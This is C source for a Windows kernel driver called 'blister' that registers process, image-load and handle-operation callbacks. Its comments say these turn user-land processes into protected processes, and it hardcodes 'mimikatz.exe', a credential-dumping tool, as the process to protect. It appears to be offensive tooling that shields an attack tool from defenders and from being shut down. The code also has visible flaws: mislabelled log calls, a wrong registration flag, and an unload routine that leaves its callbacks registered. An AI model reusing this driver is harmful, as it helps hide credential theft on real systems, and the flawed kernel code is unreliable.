#include <ntddk.h>

#include "customTypes.h"
#include "macros.h"
#include "core.h"

// function and globals definitions
DRIVER_UNLOAD UnloadDriver;

BlisterState driverState = { 0 };

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS returnStatus = STATUS_ABANDONED;
    HANDLE hThread = NULL;
    UNICODE_STRING altitudeString;
    OB_CALLBACK_REGISTRATION obOpenProcPre = { 0 };

    DriverObject->DriverUnload = UnloadDriver;

    INFO("blister has started\n");

    // initialize a mutex and protected process lists
    // since driverState is a global variable and multiple functions / threads 
    // can access, read and modify the members of the structure concurrenty
    // we need to initialize the Lock guarded mutex (KGUARDED_MUTEX)
    KeInitializeGuardedMutex(&driverState.InUse);
    InitializeListHead(&driverState.SelfProtectedProcesses);
    InitializeListHead(&driverState.ActiveSelfProtectedProcesses);

    INFO("mutex and list initialzied properly\n");

    // set the callbacks required to turn user-land processes into PPLs
    // set the ImageLoadCallbackPtr pointer in the driver callbacks to the 
    // pointer of the ImageLoadNotifyCallback function and set it with
    // PsSetLoadImageNotifyRoutine
    // @referece https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetloadimagenotifyroutine
    driverState.Callbacks.ImageLoadNotify.ImageLoadCallbackPtr = ImageLoadNotifyCallback;
    returnStatus = PsSetLoadImageNotifyRoutine(driverState.Callbacks.ImageLoadNotify.ImageLoadCallbackPtr);

    if (!NT_SUCCESS(returnStatus)) {
        ERROR("PsSetLoadImageNotifyRoutine failed to set ImageLoadNotifyCallback callback\n");
        goto PostInitialization;
    }
    
    // mark the callback as registered in the driver status structure
    driverState.Callbacks.ImageLoadNotify.IsRegistered = TRUE;
    SUCCESS("PsSetLoadImageNotifyRoutine successfully set ImageLoadNotifyCallback callback\n");

    // set the CreateProcessNotify pointer in the driver callbacks to the
    // pointer of the PCreateProcessNotifyRoutineEx function and set it with
    // PsSetCreateProcessNotifyRoutineEx
    // @reference https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetloadimagenotifyroutineex
    driverState.Callbacks.ProcessNotify.CreateProcessNotifyPtr = PCreateProcessNotifyRoutineEx;
    returnStatus = PsSetCreateProcessNotifyRoutineEx(driverState.Callbacks.ProcessNotify.CreateProcessNotifyPtr, FALSE);

    if (!NT_SUCCESS(returnStatus)) {
        ERROR("PsSetCreateProcessNotifyRoutineEx failed to set PCreateProcessNotifyRoutineEx callback\n");
        goto PostInitialization;
    }

    // mark the callback as registered in the driver status structure
    driverState.Callbacks.ProcessNotify.IsRegistered = TRUE;
    ERROR("PsSetCreateProcessNotifyRoutineEx successfully set PCreateProcessNotifyRoutineEx callback\n");

    // set the OpenProcessNotify callback
    // using the ObRegisterCallbacks function
    // @reference https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obregistercallbacks
    obOpenProcPre.Version = OB_FLT_REGISTRATION_VERSION;    // default version
    obOpenProcPre.OperationRegistrationCount = 1;           // only one entry

    // @reference https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/load-order-groups-and-altitudes-for-minifilter-drivers#types-of-load-order-groups-and-their-altitude-ranges
    RtlInitUnicodeString(&altitudeString, L"423851");       // initialize the altitude string to the Filter Load order group
    obOpenProcPre.Altitude = altitudeString;
    obOpenProcPre.RegistrationContext = NULL;

    // allocate the OperationRegistration field with the blCb (blisterCallback) tag
    // @reference https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exallocatepool2
    obOpenProcPre.OperationRegistration = (POB_OPERATION_REGISTRATION)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(OB_OPERATION_REGISTRATION), 'blCb');

    // check if the buffer was succesfully allocated
    if (obOpenProcPre.OperationRegistration == NULL) {
        returnStatus = STATUS_UNSUCCESSFUL;
        goto PostInitialization;
    }

    obOpenProcPre.OperationRegistration->ObjectType = PsProcessType;

    // handle process creation and duplication so other processes can't
    // get a privileged handle to the PPL through process duplication
    obOpenProcPre.OperationRegistration->Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;

    // finally register the PobPreOperationCallback callback using ObRegisterCallbacks
    // @reference https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obregistercallbacks
    obOpenProcPre.OperationRegistration->PreOperation = PobPreOperationCallback;
    returnStatus = ObRegisterCallbacks(&obOpenProcPre, &driverState.Callbacks.OpenProcessNotify.RegistrationHandle);

    if (!NT_SUCCESS(returnStatus)) {
        ERROR("ObRegisterCallbacks failed to set OpenProcessNotify callback\n");
        goto PostInitialization;
    }

    // mark the callback as registered in the driver status structure
    driverState.Callbacks.ProcessNotify.IsRegistered = TRUE;

PostInitialization:
    // check if the rest of the DriverEntry function went smoothly
    if (NT_SUCCESS(returnStatus)) {
        // create a thread to report the registered callbacks
        OBJECT_ATTRIBUTES objectAttributes;
        InitializeObjectAttributes(&objectAttributes, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
        returnStatus = PsCreateSystemThread(&hThread, SYNCHRONIZE, &objectAttributes, NULL, NULL, ReportCallbacks, NULL);

        if (NT_SUCCESS(returnStatus)) {
            INFO("Creating a PPL entry for the \"mimikatz.exe\" process\n");

            // set a ProtectedProcessEntry with the process name "mimikatz.exe"
            // we could also use a PID but that is obviously harder to hardcode
            // allocate the entry with a tag of blEn (blisterEntry)
            // @reference https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exallocatepool2
            UNICODE_STRING mimiEntryName = RTL_CONSTANT_STRING(L"mimikatz.exe");
            ProtectedProcessEntry* mimiEntry = (ProtectedProcessEntry*)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(ProtectedProcessEntry), 'blEn');

            if (mimiEntry != NULL) {
                // allocate a buffer for the process name with a tag of blPn (blisterProcessName)
                mimiEntry->Name = (PUNICODE_STRING)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(UNICODE_STRING), 'blPn');
                // allocate a buffer for the string buffer with a tag of blBf (blisterBuffer)
                mimiEntry->Name->Buffer = (PWCH)ExAllocatePool2(POOL_FLAG_PAGED, mimiEntryName.Length, 'blBf');
                mimiEntry->Name->MaximumLength = mimiEntryName.Length;

                // copy the name into the Name attribute of the entry
                RtlCopyUnicodeString(mimiEntry->Name, &mimiEntryName);
                // add the entry to the list of processes to protect
                InsertTailList(&driverState.SelfProtectedProcesses, &mimiEntry->CurrentEntry);
            }
            else {
                ERROR("Failed to allocate entry for the protected process\n");
                returnStatus = STATUS_UNSUCCESSFUL;
            }
        }
    }

    // like after the PostInitialization label, check if the returnValue is negative
    // meaning that the process of allocating, setting and adding the entry for mimikatz.exe
    // into the list of processes to protect failed
    // and we need to de-allocate all the buffers and un-register the callbacks
    if (!NT_SUCCESS(returnStatus)) {
        // check if any notify routines were successfully registered
        // if there are any, unregister them
        // @reference https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-psremoveloadimagenotifyroutine
        PCallbackState registeredCallbacks = &driverState.Callbacks;

        // un-register ImageLoadNotify
        if (registeredCallbacks->ImageLoadNotify.IsRegistered && registeredCallbacks->ImageLoadNotify.ImageLoadCallbackPtr != NULL) {
            PsRemoveLoadImageNotifyRoutine(registeredCallbacks->ImageLoadNotify.ImageLoadCallbackPtr);
        }

        // un-register ProcessNotify
        if (registeredCallbacks->ProcessNotify.IsRegistered && registeredCallbacks->ProcessNotify.CreateProcessNotifyPtr != NULL) {
            PsSetCreateProcessNotifyRoutineEx(registeredCallbacks->ProcessNotify.CreateProcessNotifyPtr, TRUE);
        }

        // un-register OpenProcess
        if (registeredCallbacks->OpenProcessNotify.IsRegistered && registeredCallbacks->OpenProcessNotify.OpenProcessNotifyPtr != NULL) {
            ObUnRegisterCallbacks(registeredCallbacks->OpenProcessNotify.RegistrationHandle);
        }

        // free the buffer with tag blCb (blisterCallback) allocated
        // to register the OpenProcess callback
        if (obOpenProcPre.OperationRegistration != NULL) {
            ExFreePoolWithTag(obOpenProcPre.OperationRegistration, 'blCb');
        }

        // close the thread handle if we have created it
        if (hThread != NULL) {
            ZwClose(hThread);
            hThread = NULL;
        }

        INFO("blister is exiting\n");
    }

	return returnStatus;
}

VOID UnloadDriver(IN PDRIVER_OBJECT DriverObject) {
    PDEVICE_OBJECT deviceObject = DriverObject->DeviceObject;
    PAGED_CODE();

    if (deviceObject != NULL) {
        IoDeleteDevice(deviceObject);
    }
}